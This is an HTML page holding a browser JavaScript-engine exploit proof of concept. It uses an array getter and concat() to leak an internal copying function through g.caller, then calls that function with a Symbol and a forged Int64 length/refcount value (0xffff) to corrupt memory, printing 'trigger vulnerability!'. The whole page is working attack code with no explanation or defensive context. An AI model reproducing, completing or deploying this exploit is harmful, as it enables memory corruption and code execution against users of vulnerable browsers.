<html>
<textarea id="alltext" rows="50" cols="40">
*** DUMP MESSAGE HERE ***

</textarea>
<script>
function appendMessage(msg) {
    var msg_with_line = msg + '\n';
    document.getElementById("alltext").value += msg_with_line;
}

// define mdprint here
mdprint = appendMessage;

//
function describe(obj) {
    mdprint('[Not Implemented] describe function');
}
</script>

<script src='utils.js'></script>
<script src='int64.js'></script>
<script>
function makeMemcpy() {
    var p;
    function g(){
        p = g.caller;
        return 7;
    }

    var a = [1, 2, 3];
    Object.defineProperty(a, "0", {get : g});
    a.concat([4]);
    return p;
}

var brutedMemcpy = makeMemcpy();
let leaked_obj = Symbol.for("AAAAAAAA");
let u8_array = new Uint8Array(0xAB);
let busted_len_value = new Int64('0000ffff' + '00000002').asDouble(); // //length: ffff, refcount: 2
let normal_len_value = new Int64('00000008' + '00000002').asDouble(); // //length: 8, refcount: 2
let busted_array = [busted_len_value];
let start_index = 0;

mdprint("trigger vulnerability!");
brutedMemcpy(leaked_obj, busted_array, start_index);

</script>
</html>
